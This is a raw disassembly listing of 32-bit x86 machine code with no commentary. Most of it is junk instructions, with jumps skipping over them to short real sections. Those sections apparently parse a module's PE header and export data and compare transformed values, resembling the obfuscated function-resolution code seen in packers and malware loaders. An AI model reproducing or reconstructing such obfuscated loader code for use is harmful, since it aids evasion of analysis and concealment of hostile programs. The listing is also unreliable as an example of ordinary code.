  40f1a6:	sub    eax,0x4748bdf4
  40f1ab:	ds sub al,0xbb
  40f1ae:	cdq    
  40f1af:	cs mov dl,0x5f
  40f1b2:	mov    ds,ebp
  40f1b4:	pop    edx
  40f1b5:	rol    DWORD PTR [edi+0x788d1ec3],1
  40f1bb:	and    edi,DWORD PTR [edi+0x28f785d]
  40f1c1:	push   ecx
  40f1c2:	popa   
  40f1c3:	fldcw  WORD PTR [eax+ebx*8+0x2928339c]
  40f1ca:	stc    
  40f1cb:	rol    BYTE PTR [esi+0x6d],cl
  40f1ce:	push   ss
  40f1cf:	add    ch,BYTE PTR [ecx-0x24146cff]
  40f1d5:	mov    ah,0x20
  40f1d7:	mov    ebp,eax
  40f1d9:	ins    DWORD PTR es:[edi],dx
  40f1da:	js     0x40f1f2
  40f1dc:	pop    esi
  40f1dd:	aad    0x6b
  40f1df:	leave  
  40f1e0:	or     dl,0x9b
  40f1e3:	or     BYTE PTR [esi+0x0],bh
  40f1e6:	cmp    al,0xce
  40f1e8:	cmp    BYTE PTR [ecx+ecx*1-0x3a],al
  40f1ec:	aaa    
  40f1ed:	dec    ebp
  40f1ee:	inc    esi
  40f1ef:	sub    al,0xdb
  40f1f1:	out    0x8a,eax
  40f1f3:	enter  0x9401,0x9a
  40f1f7:	je     0x40f1f9
  40f1f9:	jg     0x40f258
  40f1fb:	aam    0xa1
  40f1fd:	int    0xcb
  40f1ff:	ror    dl,cl
  40f201:	sbb    DWORD PTR [edi+0x4908d46c],edi
  40f207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f208:	mov    ecx,0x5858e647
  40f20d:	pop    edi
  40f20e:	retf   
  40f20f:	mov    al,0x7f
  40f211:	lock lds esi,FWORD PTR [esi+edi*2-0x7f]
  40f216:	add    cl,al
  40f218:	push   ebp
  40f219:	sub    al,0x58
  40f21b:	add    al,0xdb
  40f21d:	ret    0xfafb
  40f220:	(bad)
  40f225:	pop    DWORD PTR [eax+0x76]
  40f228:	out    dx,al
  40f229:	imul   ebp,DWORD PTR [ebx-0x20],0x60bae5cf
  40f230:	push   esi
  40f231:	pop    esi
  40f232:	mov    ah,0x83
  40f234:	(bad)  
  40f235:	fild   WORD PTR [edx]
  40f237:	in     eax,dx
  40f238:	sbb    BYTE PTR [edx-0x49],0x86
  40f23c:	jge    0x40f285
  40f23e:	xchg   edi,eax
  40f23f:	dec    edi
  40f240:	mov    edi,0xc49acd73
  40f245:	jae    0x40f290
  40f247:	inc    eax
  40f248:	mov    bl,0x54
  40f24a:	push   ebx
  40f24b:	jecxz  0x40f270
  40f24d:	mov    ebx,0x57245e38
  40f252:	(bad)  
  40f253:	or     ecx,DWORD PTR [ecx]
  40f255:	les    esi,FWORD PTR ds:0x4b094546
  40f25b:	jmp    0x40f248
  40f25d:	mov    al,ds:0x2309bce0
  40f262:	retf   
  40f263:	mov    eax,ds:0x3658514d
  40f268:	cmp    BYTE PTR [edx+0x277c7ee9],bl
  40f26e:	js     0x40f2b3
  40f270:	mov    ds:0x36825f09,eax
  40f275:	cmp    eax,0x67bb92f0
  40f27a:	icebp  
  40f27b:	fs pop es
  40f27d:	xor    DWORD PTR [eax-0x71],esi
  40f280:	inc    DWORD PTR [ebp-0x65]
  40f283:	inc    eax
  40f284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f285:	inc    esi
  40f286:	aad    0x3
  40f288:	pop    esp
  40f289:	push   eax
  40f28a:	stc    
  40f28b:	daa    
  40f28c:	sbb    DWORD PTR [ecx+edi*2-0x34],0xa2d1a0cd
  40f294:	test   BYTE PTR [esi-0x671155f],0x1
  40f29b:	jp     0x40f310
  40f29d:	lds    ebp,FWORD PTR [ebp+0x12]
  40f2a0:	(bad)  
  40f2a1:	call   0xe01bb85a
  40f2a6:	xchg   ebx,ebp
  40f2a8:	scas   eax,DWORD PTR es:[edi]
  40f2a9:	data16 or al,0xa2
  40f2ac:	mov    WORD PTR [ebx],gs
  40f2ae:	xchg   BYTE PTR [esp+eax*2-0x57cbfbd3],ah
  40f2b5:	inc    ecx
  40f2b6:	(bad)  
  40f2b7:	sbb    ebp,DWORD PTR [ecx+0x8]
  40f2ba:	pop    ss
  40f2bb:	aaa    
  40f2bc:	(bad)  
  40f2bd:	out    0x1a,al
  40f2bf:	stc    
  40f2c0:	jecxz  0x40f24e
  40f2c2:	pop    esi
  40f2c3:	and    eax,0xc72c6c
  40f2c8:	mov    DWORD PTR [esi],ebx
  40f2ca:	xor    al,0x60
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	shl    BYTE PTR [ebx+edi*2+0x36],1
  40f2fa:	adc    eax,0x7070a976
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f370
  40f304:	ret    0xf383
  40f307:	inc    eax
  40f308:	out    0xd,eax
  40f30a:	stos   BYTE PTR es:[edi],al
  40f30b:	cwde   
  40f30c:	js     0x40f314
  40f30e:	int3   
  40f30f:	xchg   ecx,eax
  40f310:	and    bh,ah
  40f312:	sub    edi,DWORD PTR [ebp+0x5b]
  40f315:	shr    BYTE PTR [ebx-0x4c],1
  40f318:	dec    ax
  40f31a:	fs loope 0x40f2ad
  40f31d:	mov    edx,0xd2e693a7
  40f322:	mov    edi,ebx
  40f324:	rcr    cl,cl
  40f326:	pop    esp
  40f327:	sub    BYTE PTR [ecx+0x4],al
  40f32a:	push   ebx
  40f32b:	jmp    0xa409:0x7e2d5df
  40f332:	dec    esi
  40f333:	xchg   DWORD PTR [edx-0x75f2b8de],esp
  40f339:	adc    cl,BYTE PTR [edx]
  40f33b:	or     DWORD PTR [edx+0x66],esi
  40f33e:	adc    eax,0xb2724f33
  40f343:	pushf  
  40f344:	fst    QWORD PTR [ecx-0x53]
  40f347:	inc    esp
  40f348:	aam    0x49
  40f34a:	xor    eax,DWORD PTR [ebx]
  40f34c:	push   cs
  40f34d:	cwde   
  40f34e:	mov    eax,ds:0x1b1d15da
  40f353:	mov    esp,0xcea69931
  40f358:	mov    dl,0x92
  40f35a:	repnz push 0x27a5701e
  40f360:	test   eax,0x1354ca7
  40f365:	sti    
  40f366:	dec    edx
  40f367:	mov    eax,0xa428010d
  40f36c:	int    0xa0
  40f36e:	mov    al,0x5a
  40f370:	inc    esp
  40f371:	sub    al,0x72
  40f373:	movmskps edx,xmm3
  40f376:	pushf  
  40f377:	cmp    edx,eax
  40f379:	cmc    
  40f37a:	mov    ds:0x99c29cc7,eax
  40f37f:	or     edi,DWORD PTR [edi+0x36]
  40f382:	ins    BYTE PTR es:[edi],dx
  40f383:	or     eax,0x47f981a3
  40f388:	leave  
  40f389:	clc    
  40f38a:	sar    BYTE PTR [eax-0x2d],1
  40f38d:	inc    ebp
  40f38e:	adc    bl,bl
  40f390:	lock push ebx
  40f392:	(bad)  
  40f393:	out    0x7e,al
  40f395:	repnz (bad) 
  40f397:	stos   DWORD PTR es:[edi],eax
  40f398:	inc    edx
  40f399:	out    dx,eax
  40f39a:	or     ebp,DWORD PTR [edx]
  40f39c:	ffreep st(1)
  40f39e:	cmp    BYTE PTR [ebx-0x5a],al
  40f3a1:	xor    al,0xaa
  40f3a3:	nop
  40f3a4:	rcr    DWORD PTR [edx],1
  40f3a6:	pop    ds
  40f3a7:	outs   dx,DWORD PTR ds:[esi]
  40f3a8:	xor    al,0x8
  40f3aa:	sbb    eax,0x7a4b7f07
  40f3af:	mov    ds:0xb3d833ea,al
  40f3b4:	sub    eax,0xba467f8c
  40f3b9:	sahf   
  40f3ba:	mov    al,0x74
  40f3bc:	sub    eax,DWORD PTR ds:0x1f720e0e
  40f3c2:	popf   
  40f3c3:	outs   dx,BYTE PTR ds:[esi]
  40f3c4:	fpatan 
  40f3c6:	(bad)  
  40f3c7:	jno    0x40f371
  40f3c9:	dec    ebp
  40f3ca:	mov    edx,0xf4fe2475
  40f3cf:	arpl   WORD PTR [ebx],ax
  40f3d1:	xchg   BYTE PTR [esi],bl
  40f3d3:	jnp    0x40f452
  40f3d5:	xchg   ebx,eax
  40f3d6:	pop    esp
  40f3d7:	jb     0x40f3be
  40f3d9:	push   ebx
  40f3da:	and    bh,dh
  40f3dc:	mov    bh,0x35
  40f3de:	mov    dh,0x1c
  40f3e0:	mov    ds:0xee30d8aa,eax
  40f3e5:	or     eax,0x7765d0d4
  40f3ea:	xor    dh,bh
  40f3ec:	push   0xffffffd3
  40f3ee:	shl    eax,cl
  40f3f0:	xchg   edi,eax
  40f3f1:	add    bl,BYTE PTR [ebx+edi*8]
  40f3f4:	and    DWORD PTR [ecx],esi
  40f3f6:	and    edi,eax
  40f3f8:	js     0x40f3f4
  40f3fa:	xor    edx,DWORD PTR [edx+0x1ca1fc57]
  40f400:	js     0x40f3d7
  40f402:	inc    edi
  40f403:	xor    bh,BYTE PTR [edi+0x10f77504]
  40f409:	lods   al,BYTE PTR ds:[esi]
  40f40a:	add    DWORD PTR [edi],eax
  40f40c:	jmp    0x8060:0xa5a9066c
  40f413:	std    
  40f414:	mov    bh,BYTE PTR [edi+0x27]
  40f417:	data16 ds or al,0x48
  40f41b:	adc    al,0xa9
  40f41d:	pop    ecx
  40f41e:	inc    ebx
  40f41f:	call   0xaf0e:0x80c06089
  40f426:	dec    eax
  40f427:	sar    dh,0xf1
  40f42a:	popa   
  40f42b:	xor    ecx,0xed4b8eae
  40f431:	lds    edi,FWORD PTR [ebp+0x1d7c7191]
  40f437:	push   ecx
  40f438:	ficom  WORD PTR [ebp-0x3e0b5ced]
  40f43e:	loopne 0x40f441
  40f440:	xor    DWORD PTR [edx+eax*1-0x65],eax
  40f444:	add    al,0xe0
  40f446:	jnp    0x40f3f2
  40f448:	cmp    ebp,DWORD PTR [edi-0x256a405d]
  40f44e:	(bad)  
  40f44f:	mov    al,ds:0xe9f8458b
  40f454:	add    DWORD PTR gs:[eax],eax
  40f457:	add    BYTE PTR [eax+0x65],al
  40f45a:	ror    ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	push   ebp
  40f465:	add    al,BYTE PTR [edi]
  40f467:	sar    DWORD PTR [ecx],0xb7
  40f46a:	jo     0x40f4dc
  40f46c:	ret    
  40f46d:	jg     0x40f4df
  40f46f:	jo     0x40f48a
  40f471:	out    dx,al
  40f472:	fisubr DWORD PTR [ebx+0x1c]
  40f475:	out    0xb9,al
  40f477:	cld    
  40f478:	rcl    al,1
  40f47a:	add    dh,al
  40f47c:	add    ah,dl
  40f47e:	stos   BYTE PTR es:[edi],al
  40f47f:	add    al,dl
  40f481:	push   ebx
  40f482:	push   esi
  40f483:	loop   0x40f433
  40f485:	nop    eax
  40f488:	xlat   BYTE PTR ds:[ebx]
  40f489:	dec    esp
  40f48a:	inc    edi
  40f48b:	or     al,0x38
  40f48d:	aad    0xbe
  40f48f:	xor    BYTE PTR [eax-0x63be66b5],ch
  40f495:	ffree  st(3)
  40f497:	mov    bl,0x43
  40f499:	stos   BYTE PTR es:[edi],al
  40f49a:	jecxz  0x40f4e9
  40f49c:	retf   0x858c
  40f49f:	sub    BYTE PTR [ecx-0x9],cl
  40f4a2:	ds out 0x8b,al
  40f4a5:	mov    esi,0xb1e909dc
  40f4aa:	loope  0x40f4b6
  40f4ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4ad:	pop    ss
  40f4ae:	outs   dx,BYTE PTR ds:[esi]
  40f4af:	adc    ecx,0x2c
  40f4b2:	push   edi
  40f4b3:	aad    0x14
  40f4b5:	fmul   DWORD PTR [edi]
  40f4b7:	retf   0x4dd5
  40f4ba:	out    dx,eax
  40f4bb:	hlt    
  40f4bc:	popa   
  40f4bd:	pop    eax
  40f4be:	push   eax
  40f4bf:	cwde   
  40f4c0:	mov    BYTE PTR [eax],cl
  40f4c2:	inc    edx
  40f4c3:	xor    ch,bh
  40f4c5:	addr16 loopne 0x40f4b2
  40f4c8:	ret    0x596d
  40f4cb:	mov    ch,0x2a
  40f4cd:	cmp    esi,DWORD PTR [esi-0x73]
  40f4d0:	add    eax,0xacc71402
  40f4d5:	cmp    al,0x4f
  40f4d7:	push   ebp
  40f4d8:	pushf  
  40f4d9:	and    bh,al
  40f4db:	cdq    
  40f4dc:	xor    BYTE PTR [edi],cl
  40f4de:	sbb    DWORD PTR [esi+0x24ef93da],ebp
  40f4e4:	jne    0x40f54c
  40f4e6:	es loop 0x40f4ac
  40f4e9:	(bad)  
  40f4ea:	aad    0xde
  40f4ec:	stc    
  40f4ed:	sub    eax,0xc7971a54
  40f4f2:	data16 cmp BYTE PTR [ecx+0x35],0x64
  40f4f7:	dec    edi
  40f4f8:	or     BYTE PTR gs:[eax+0x709d46e8],0xb9
  40f500:	sub    BYTE PTR [ecx-0xc5365c0],dh
  40f506:	ror    al,cl
  40f508:	add    bh,BYTE PTR [edx]
  40f50a:	cs mov dl,0x54
  40f50d:	scas   eax,DWORD PTR es:[edi]
  40f50e:	jge    0x40f585
  40f510:	pop    edi
  40f511:	shr    BYTE PTR [ebx-0x12],1
  40f514:	int3   
  40f515:	call   0xfb73717f
  40f51a:	sub    BYTE PTR ds:0xc5ccaf26,0xa6
  40f521:	push   es
  40f522:	push   ss
  40f523:	data16 sub al,0xd7
  40f526:	hlt    
  40f527:	les    ecx,FWORD PTR [ecx]
  40f529:	adc    DWORD PTR [ecx+esi*1+0x787f50c0],eax
  40f530:	sub    DWORD PTR [edi+0x21],0xffffff80
  40f534:	pop    ebx
  40f535:	shl    DWORD PTR [edx+0xe8a64c2],0x8c
  40f53c:	pop    ebx
  40f53d:	cmc    
  40f53e:	inc    edi
  40f53f:	enter  0x34fe,0xd2
  40f543:	mov    bh,0x6d
  40f545:	and    edi,DWORD PTR [edx]
  40f547:	and    eax,0x49826260
  40f54c:	call   0xd37c0416
  40f551:	outs   dx,BYTE PTR ds:[esi]
  40f552:	mov    BYTE PTR [eax+0x3e20b67d],cl
  40f558:	mov    edi,0x619e8224
  40f55d:	pop    ebp
  40f55e:	aam    0x86
  40f560:	mov    eax,0xc4566b28
  40f565:	ret    0x525d
  40f568:	sub    ebp,DWORD PTR [ecx-0x200f9aa1]
  40f56e:	or     BYTE PTR [ebp+0x45],dh
  40f571:	iret   
  40f572:	xor    eax,0x38f70a3c
  40f577:	pop    esp
  40f578:	out    dx,al
  40f579:	pop    edx
  40f57a:	stc    
  40f57b:	xchg   ebp,eax
  40f57c:	cmp    ecx,DWORD PTR [edx]
  40f57e:	sub    DWORD PTR [ebx+0x2c62354f],edi
  40f584:	test   BYTE PTR [esi],0x16
  40f587:	or     BYTE PTR [ebx+0x631640cf],bh
  40f58d:	inc    edi
  40f58e:	daa    
  40f58f:	daa    
  40f590:	dec    edx
  40f591:	cmp    al,0x72
  40f593:	int3   
  40f594:	(bad)  
  40f595:	call   0xea46:0x819f618c
  40f59c:	aad    0x7b
  40f59e:	lock add al,0xde
  40f5a1:	jbe    0x40f5d9
  40f5a3:	stc    
  40f5a4:	dec    ebx
  40f5a5:	in     eax,dx
  40f5a6:	in     eax,dx
  40f5a7:	or     al,0xb2
  40f5a9:	(bad)  
  40f5aa:	popa   
  40f5ab:	xor    dh,dh
  40f5ad:	idiv   ch
  40f5af:	lahf   
  40f5b0:	bound  esi,QWORD PTR [eax+0x32]
  40f5b3:	je     0x40f5bc
  40f5b5:	xchg   edx,eax
  40f5b6:	jle    0x40f5dd
  40f5b8:	inc    ebp
  40f5b9:	xchg   esi,eax
  40f5ba:	jno    0x40f5b1
  40f5bc:	icebp  
  40f5bd:	mov    eax,DWORD PTR [eax]
  40f5bf:	mov    eax,DWORD PTR [eax+0x3c]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	pop    ebx
  40f604:	adc    eax,0xb68c364c
  40f609:	jo     0x40f67b
  40f60b:	ret    
  40f60c:	jg     0x40f67e
  40f60e:	jo     0x40f65d
  40f610:	fisttp DWORD PTR [ebx]
  40f612:	sub    ebx,DWORD PTR [esi-0x4d7f2fb2]
  40f618:	ins    DWORD PTR es:[edi],dx
  40f619:	and    BYTE PTR [eax+esi*2-0x60],ch
  40f61d:	mov    edi,0xd5d7d8c3
  40f622:	scas   al,BYTE PTR es:[edi]
  40f623:	add    ah,BYTE PTR [esi-0x36f0d274]
  40f629:	aaa    
  40f62a:	mov    esp,0xa064b134
  40f62f:	and    DWORD PTR [edi+0x57edf651],esp
  40f635:	fdiv   QWORD PTR [ebx]
  40f637:	das    
  40f638:	mov    BYTE PTR [edx+ebx*1+0x699bc09a],dl
  40f63f:	push   ebx
  40f640:	dec    edi
  40f641:	imul   edi,DWORD PTR [eax],0x84f69abb
  40f647:	ret    0x2bdb
  40f64a:	xor    BYTE PTR [edi],bh
  40f64c:	dec    ebx
  40f64d:	test   DWORD PTR [eax+0x60],esp
  40f650:	cmp    esi,DWORD PTR [ecx+0x50159dc7]
  40f656:	xor    ebp,ebp
  40f658:	pushf  
  40f659:	ss push eax
  40f65b:	jbe    0x40f62d
  40f65d:	cmc    
  40f65e:	mov    ds:0x6e9501fa,al
  40f663:	stos   DWORD PTR es:[edi],eax
  40f664:	and    al,0xb8
  40f666:	fmul   QWORD PTR [esi+0x31c5cb23]
  40f66c:	dec    eax
  40f66d:	jp     0x40f648
  40f66f:	jp     0x40f5fb
  40f671:	enter  0xfb3b,0x47
  40f675:	sahf   
  40f676:	sub    eax,0x453f98d2
  40f67b:	daa    
  40f67c:	push   esp
  40f67d:	cmc    
  40f67e:	mov    esi,0x22cbb34f
  40f683:	jns    0x40f61b
  40f685:	lea    ecx,[ebx+0x21]
  40f688:	nop
  40f689:	in     al,dx
  40f68a:	dec    ebx
  40f68b:	sbb    BYTE PTR [edi+0x25],0x82
  40f68f:	call   0x8d2a1fa4
  40f694:	sti    
  40f695:	outs   dx,BYTE PTR ds:[esi]
  40f696:	jp     0x40f65f
  40f698:	out    0xc2,eax
  40f69a:	(bad)  
  40f69b:	mov    ch,0xfc
  40f69d:	xor    al,0x1f
  40f69f:	enter  0xa723,0x96
  40f6a3:	mov    ebx,0x2c851c87
  40f6a8:	jo     0x40f6fc
  40f6aa:	pop    ecx
  40f6ab:	popa   
  40f6ac:	repnz ins BYTE PTR es:[edi],dx
  40f6ae:	cwde   
  40f6af:	mov    BYTE PTR [eax+esi*8-0x42672d2c],cl
  40f6b6:	js     0x40f71d
  40f6b8:	gs pop ds
  40f6ba:	scas   eax,DWORD PTR es:[edi]
  40f6bb:	ins    DWORD PTR es:[edi],dx
  40f6bc:	outs   dx,DWORD PTR ds:[esi]
  40f6bd:	push   ss
  40f6be:	xor    al,0x93
  40f6c0:	out    0x21,eax
  40f6c2:	xchg   ebp,eax
  40f6c3:	jnp    0x40f680
  40f6c5:	sub    ecx,DWORD PTR [ebp+0x2f]
  40f6c8:	sub    al,0xbb
  40f6ca:	mov    ch,bh
  40f6cc:	call   0x2fb47eb
  40f6d1:	sahf   
  40f6d2:	cs (bad) 
  40f6d4:	in     eax,0x19
  40f6d6:	inc    edi
  40f6d7:	pop    esi
  40f6d8:	stc    
  40f6d9:	(bad)  
  40f6da:	cmp    BYTE PTR [edx+0x79],bh
  40f6dd:	sub    edx,DWORD PTR [eax]
  40f6df:	inc    edx
  40f6e0:	into   
  40f6e1:	dec    esp
  40f6e2:	mov    dl,BYTE PTR [edi]
  40f6e4:	push   esi
  40f6e5:	dec    edi
  40f6e6:	mov    ah,0x36
  40f6e8:	jb     0x40f762
  40f6ea:	rcr    DWORD PTR [ebx+0x7a54e562],cl
  40f6f0:	push   es
  40f6f1:	mov    esp,DWORD PTR [ebx-0x4a82236b]
  40f6f7:	push   esi
  40f6f8:	stc    
  40f6f9:	jo     0x40f69d
  40f6fb:	sbb    BYTE PTR [edi],bl
  40f6fd:	xchg   esp,eax
  40f6fe:	in     al,0xea
  40f700:	retf   
  40f701:	test   eax,0x529bb363
  40f706:	mov    al,0xbf
  40f708:	sbb    DWORD PTR [esi-0x51f911ac],edi
  40f70e:	cmp    esi,eax
  40f710:	add    DWORD PTR [ebx-0x6fc2ff7c],esi
  40f716:	adc    al,0x9
  40f718:	push   es
  40f719:	test   al,0xd6
  40f71b:	push   cs
  40f71c:	retf   
  40f71d:	cs xor bh,dl
  40f720:	js     0x40f763
  40f722:	stos   BYTE PTR es:[edi],al
  40f723:	pop    esi
  40f724:	lds    ebx,FWORD PTR [edi]
  40f726:	(bad)  
  40f727:	aam    0x2c
  40f729:	and    al,0xd7
  40f72b:	mov    WORD PTR ds:[edi+0x3dba5887],fs
  40f732:	push   ecx
  40f733:	mov    dh,BYTE PTR [esi+edx*2-0x747174ce]
  40f73a:	rcl    BYTE PTR [ebx-0x2c],1
  40f73d:	aaa    
  40f73e:	cmp    BYTE PTR [edx+0x62],ch
  40f741:	pop    es
  40f742:	push   ss
  40f743:	(bad)  
  40f745:	mov    ebx,0x112ac0aa
  40f74a:	sbb    BYTE PTR [edx-0x14],0xe8
  40f74e:	jne    0x40f6d1
  40f750:	dec    ebx
  40f751:	adc    edi,ecx
  40f753:	fsub   QWORD PTR [ebp-0x2c4c39fa]
  40f759:	rcl    BYTE PTR [edx-0x7ba743c],1
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x11946f3
  40f7e3:	maxps  xmm6,XMMWORD PTR [di+0x7070]
  40f7e9:	mov    ds:0xef70707d,eax
  40f7ee:	fisttp DWORD PTR [edi]
  40f7f0:	sahf   
  40f7f1:	imul   cl
  40f7f3:	pop    eax
  40f7f4:	jp     0x40f77a
  40f7f6:	push   edx
  40f7f7:	push   edi
  40f7f8:	rcl    BYTE PTR [edx],1
  40f7fa:	sbb    DWORD PTR [esi+0x7a80e3f],0x15209308
  40f804:	or     al,BYTE PTR [esi]
  40f806:	leave  
  40f807:	mov    ss,WORD PTR [ecx+0x59]
  40f80a:	xlat   BYTE PTR ds:[ebx]
  40f80b:	test   DWORD PTR [ecx-0x3ca4fb8b],0x6b3a5f20
  40f815:	mov    al,ds:0xea12f645
  40f81a:	imul   edi,DWORD PTR [ebx],0x20
  40f81d:	leave  
  40f81e:	mov    ch,0x50
  40f820:	and    ah,ah
  40f822:	bound  edx,QWORD PTR [ecx-0x3f641147]
  40f828:	aad    0x60
  40f82a:	out    0x5e,al
  40f82c:	add    DWORD PTR [edx],eax
  40f82e:	retf   0xd0bb
  40f831:	ret    0xb8ee
  40f834:	push   ebx
  40f835:	mov    dl,0xa4
  40f837:	jg     0x40f856
  40f839:	in     eax,dx
  40f83a:	dec    eax
  40f83b:	push   0x6b09dffe
  40f840:	mov    edi,0x25c62d18
  40f845:	lds    eax,FWORD PTR cs:[ebx]
  40f848:	int    0x11
  40f84a:	xchg   edi,eax
  40f84b:	mov    ss,WORD PTR [ebx-0x6b16094d]
  40f851:	and    BYTE PTR [eax-0x5a8be6fe],dh
  40f857:	inc    ecx
  40f858:	loop   0x40f875
  40f85a:	rcr    DWORD PTR [ebx+0x66b59e5a],0x9f
  40f861:	push   ss
  40f862:	dec    edi
  40f863:	jns    0x40f857
  40f865:	add    ah,bl
  40f867:	mov    dl,0x9
  40f869:	xchg   esi,eax
  40f86a:	jb     0x40f80b
  40f86c:	and    eax,0xdb2df6ed
  40f871:	sti    
  40f872:	add    esi,0xffffffe2
  40f875:	jbe    0x40f895
  40f877:	or     eax,0xa2606308
  40f87c:	push   esp
  40f87d:	cwde   
  40f87e:	mov    ebp,0xf3468b3d
  40f883:	sub    bh,BYTE PTR [edx+ebp*2-0x6ad84c91]
  40f88a:	push   eax
  40f88b:	jl     0x40f869
  40f88d:	inc    edx
  40f88e:	test   DWORD PTR [esi],ecx
  40f890:	pushf  
  40f891:	mov    esi,0x57f1ef15
  40f896:	sar    BYTE PTR [ecx],cl
  40f898:	xor    eax,0xc3f1ebde
  40f89d:	cmp    eax,0x354e7677
  40f8a2:	shr    DWORD PTR [edi],1
  40f8a4:	pop    ss
  40f8a5:	mov    bl,0x1b
  40f8a7:	lock mov ah,ch
  40f8aa:	or     eax,0xed28da3f
  40f8af:	cld    
  40f8b0:	xchg   BYTE PTR [edx+esi*2],ah
  40f8b3:	scas   eax,DWORD PTR es:[edi]
  40f8b4:	retf   
  40f8b5:	cmp    DWORD PTR [ebx-0x2f],esi
  40f8b8:	stos   DWORD PTR es:[edi],eax
  40f8b9:	or     eax,esi
  40f8bb:	cmp    ecx,DWORD PTR [edx+0x39f1f246]
  40f8c1:	ret    
  40f8c2:	test   al,0x77
  40f8c4:	pusha  
  40f8c5:	adc    cl,ah
  40f8c7:	aad    0xcb
  40f8c9:	test   eax,0x950e2741
  40f8ce:	btr    DWORD PTR [esi+esi*2-0x3e7563c6],eax
  40f8d6:	push   edx
  40f8d7:	xchg   esp,eax
  40f8d8:	fwait
  40f8d9:	dec    ebp
  40f8da:	and    eax,0x81964cc3
  40f8df:	lea    eax,[eax-0x64bbd3fa]
  40f8e5:	pop    esp
  40f8e6:	mov    ebx,0xdf7aba78
  40f8eb:	std    
  40f8ec:	jne    0x40f91e
  40f8ee:	das    
  40f8ef:	sub    BYTE PTR [esi-0x5df5ca40],dh
  40f8f5:	fiadd  DWORD PTR [ebx+0x5e]
  40f8f8:	mov    eax,0x8a7b3745
  40f8fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8fe:	sbb    al,0x6a
  40f900:	push   cs
  40f901:	or     eax,0xb37881cf
  40f906:	or     BYTE PTR [edi+0x602dcfab],ah
  40f90c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f90d:	test   eax,0xba6d1bae
  40f912:	pop    ecx
  40f913:	cmp    DWORD PTR [esi-0x42],esi
  40f916:	xor    al,0xc8
  40f918:	xchg   DWORD PTR [esp+eax*8-0x1bcf9ac5],edx
  40f91f:	push   0x47
  40f921:	add    ecx,DWORD PTR [eax+0x2f]
  40f924:	fs fstp DWORD PTR ss:[ebp+0x16]
  40f929:	jne    0x40f96d
  40f92b:	data16 (bad) [ebx]
  40f92e:	or     bl,ah
  40f930:	and    bl,BYTE PTR ds:0x13c87308
  40f936:	and    DWORD PTR [ebx+0x4f04bd85],esi
  40f93c:	adc    eax,0x75e6306d
  40f941:	sbb    DWORD PTR [ebp+0x6d292897],0xafe86466
